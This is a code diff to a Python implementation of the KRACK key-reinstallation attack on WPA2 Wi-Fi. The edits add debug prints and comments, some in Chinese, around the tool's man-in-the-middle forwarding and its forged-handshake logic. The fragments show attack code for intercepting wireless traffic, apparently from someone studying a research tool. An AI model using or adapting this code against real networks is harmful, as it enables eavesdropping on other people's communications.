@@ -163,7 +163,7 @@ def get_eapol_msgnum(p):
 	if not p.haslayer(EAPOL): return 0
 	keyinfo = bytes(p[EAPOL])[5:7]
 	flags = struct.unpack(">H", keyinfo)[0]
-	# 四次交握 pairwise 都是 1
+	# pairwise 都是 1
 	if flags & FLAG_PAIRWISE:
 		# ACK 為 1，sent by server
 		if flags & FLAG_ACK:
@@ -523,7 +523,7 @@ class KRAckAttack():
 			client.store_msg1(p)
 		elif eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
 			client.add_if_new_msg3(p)
-			# FIXME: timeout on the client side
+			# !-- FIXME: timeout on the client side
 			if len(client.msg3s) >= 2:
 				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
 				log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)
@@ -652,7 +652,9 @@ class KRAckAttack():
 			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
 			might_forward = might_forward or (args.group and dot11_is_group(p) and p.haslayer(Dot11WEP))
 
-			# Pay special attention to Deauth and Disassoc frames
+			print('Debug: ', end='')
+			print(might_forward) # !-- 
+			# 需要特別注意 Deauth and Disassoc frames
 			if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
 				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
 			# print 所有轉送的封包
@@ -661,12 +663,12 @@ class KRAckAttack():
 			elif might_forward:
 				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
 
-			# Now perform actual actions that need to be taken, along with additional output
 			if might_forward:
 				# Unicast frames to clients
 				if p.addr1 in self.clients:
 					client = self.clients[p.addr1]
-					# Note: client 要在接收到 msg3 送出 msg4 前，切換到 rogue channel
+					# !-- CHECK[yes]: client 要在接收到 msg3 送出 msg4 前，切換到 rogue channel
+					# !-- CHECK[   ]: time out problem?
 					if self.handle_to_client_pairwise(client, p):
 						pass
 					elif self.handle_to_client_groupkey(client, p):
